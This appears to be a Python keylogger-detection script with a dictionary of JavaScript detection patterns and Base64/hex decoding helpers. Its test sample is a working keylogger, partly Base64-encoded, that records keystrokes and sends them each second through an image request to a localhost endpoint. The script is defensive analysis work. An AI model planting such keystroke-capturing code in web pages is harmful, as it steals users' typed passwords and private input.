import re
import base64
import binascii

# Common characteristics to detect (excluding points 5, 7, and 10)
COMMON_CHARACTERISTICS = {
    "Event Listeners": ["keydown", "keypress", "keyup"],
    "Key Code Conversion": ["String.fromCharCode", "e.keyCode", "e.which", "e.key"],
    "Data Accumulation": ["record", "keys", "buffer"],
    "Data Transmission": ["$.ajax", "new Image().src", "WebSocket", "ws.send"],
    "Cross-Domain Requests":["crossDomain: true"],
    "Special Key Handling": ["Backspace", "Enter", "Shift", "Tab", "Ctrl", "Alt", "Esc", "Delete", "CapsLock"],
    "Error Handling": ["success", "error", "onmessage"],
}

# Test code
TEST_CODE = '''ZG9jdW1lbnQub25rZXlkb3duID0gZnVuY3Rpb24oZSkgew0KICB2YXIga2V5ID0gZS5rZXlDb2RlID8gZS5rZXlDb2RlIDogZS53aGljaDsNCiAgaWYgKGtleSA9PT0gOCkgew0KICAgIGtleXMgKz0gJ1tCQUNLU1BBQ0VdJzsNCiAgfSBlbHNlIGlmIChrZXkgPT09IDkpIHsNCiAgICBrZXlzICs9ICdbVEFCXSc7DQogIH0gZWxzZSBpZiAoa2V5ID09PSAxMykgew0KICAgIGtleXMgKz0gJ1tFTlRFUl0nOw0KICB9IGVsc2UgaWYgKGtleSA9PT0gMTYpIHsNCiAgICBrZXlzICs9ICdbU0hJRlRdJzsNCiAgfSBlbHNlIGlmIChrZXkgPT09IDE3KSB7DQogICAga2V5cyArPSAnW0NUUkxdJzsNCiAgfSBlbHNlIGlmIChrZXkgPT09IDE4KSB7DQogICAga2V5cyArPSAnW0FMVF0nOw0KICB9IGVsc2UgaWYgKGtleSA9PT0gMjcpIHsNCiAgICBrZXlzICs9ICdbRVNDXSc7DQogIH0gZWxzZSBpZiAoa2V5ID09PSA0Nikgew0KICAgIGtleXMgKz0gJ1tERUxFVEVdJzsNCiAgfSBlbHNlIGlmIChrZXkgPT09IDIwKSB7DQogICAga2V5cyArPSAnW0NBUFNMT0NLXSc7DQogIH0gZWxzZSBpZiAoa2V5ID49IDk2ICYmIGtleSA8PSAxMDUpIHsNCiAgICBrZXlzICs9IChrZXkgLSA5NikudG9TdHJpbmcoKTsNCiAgfSBlbHNlIHsNCiAgICBrZXlzICs9IFN0cmluZy5mcm9tQ2hhckNvZGUoa2V5KTsNCiAgfQ0KfQ0K window.setInterval(function(){
  if(keys){
    new Image().src = 'http://localhost:9090/?k=' + keys;
    keys = '';
  }
}, 1000);'''


def is_obfuscated(code):
    """
    Detects if the code is obfuscated by checking for unusual patterns.
    """
    # Simple heuristic: Check for excessive use of non-alphanumeric characters
    non_alphanum_ratio = len(re.findall(r"[^a-zA-Z0-9\s]", code)) / len(code)
    return non_alphanum_ratio > 0.5  # Arbitrary threshold


def deobfuscate(code):
    """
    Attempts to de-obfuscate the code by evaluating it (for demonstration purposes only).
    WARNING: Executing obfuscated code can be dangerous. Use in a controlled environment.
    """
    try:
        # This is a placeholder for actual de-obfuscation logic
        # In practice, you would need to reverse-engineer the obfuscation method
        return code  # Return as-is for this example
    except Exception as e:
        print(f"De-obfuscation failed: {e}")
        return code


def is_encoded(code):
    """
    Detects if the code is encoded in Base64 or Hex.
    """
    try:
        # Check for Base64
        base64.b64decode(code, validate=True)
        return "Base64"
    except binascii.Error:
        try:
            # Check for Hex
            bytes.fromhex(code)
            return "Hex"
        except ValueError:
            return None


def decode(code, encoding):
    """
    Decodes the code based on the detected encoding.
    """
    if encoding == "Base64":
        return base64.b64decode(code).decode("utf-8")
    elif encoding == "Hex":
        return bytes.fromhex(code).decode("utf-8")
    else:
        return code


def count_characteristics(code):
    """
    Counts the occurrences of each common characteristic in the code and records the matched parts.
    """
    counts = {key: {"count": 0, "matches": []} for key in COMMON_CHARACTERISTICS}
    for characteristic, patterns in COMMON_CHARACTERISTICS.items():
        for pattern in patterns:
            matches = re.findall(re.escape(pattern), code, re.IGNORECASE)
            if matches:
                counts[characteristic]["count"] += len(matches)
                counts[characteristic]["matches"].extend(matches)
    return counts


def is_base64(s):
    """
    Checks if a string is a valid Base64 encoded string.
    """
    base64_pattern = re.compile(r'^[A-Za-z0-9+/]+={0,2}$')
    return bool(base64_pattern.match(s))


def decode_and_combine(code):
    """
    Detects and decodes Base64 encoded strings within the input code.
    """
    words = code.split()
    combined_output = []

    for word in words:
        if is_base64(word):
            try:
                decoded_bytes = base64.b64decode(word)
                decoded_string = decoded_bytes.decode("utf-8")
                combined_output.append(decoded_string)
                print(f"Decoded Base64 string '{word}' to: {decoded_string}")
            except:
                combined_output.append(word)
        else:
            combined_output.append(word)

    return " ".join(combined_output)


def analyze_code(code):
    """
    Analyzes the code for obfuscation, encoding, and common characteristics.
    """
    # Step 1: Detect and de-obfuscate
    if is_obfuscated(code):
        print("Code is obfuscated. Attempting to de-obfuscate...")
        code = deobfuscate(code)
    else:
        print("Code is not obfuscated.")

    # Step 2: Detect and decode Base64 strings within the code
    print("Checking for Base64 encoded strings within the code...")
    code = decode_and_combine(code)

    # Step 3: Detect and decode the entire code if it is encoded
    encoding = is_encoded(code)
    if encoding:
        print(f"Code is encoded in {encoding}. Decoding...")
        code = decode(code, encoding)
    else:
        print("Code is not encoded.")

    # Step 4: Count characteristics and print matched parts
    counts = count_characteristics(code)
    print("\nCharacteristic Counts and Matches:")
    for characteristic, data in counts.items():
        print(f"{characteristic}: {data['count']} occurrences")
        if data["matches"]:
            print(f"  Matches: {', '.join(data['matches'])}")

    # Step 5: Output whether the code was encoded
    print(f"\nWas the code encoded? {encoding is not None}")

    # Step 6: Output the final processed code
    print("\nFinal processed code:")
    print(code)


# Run the analysis
analyze_code(TEST_CODE)
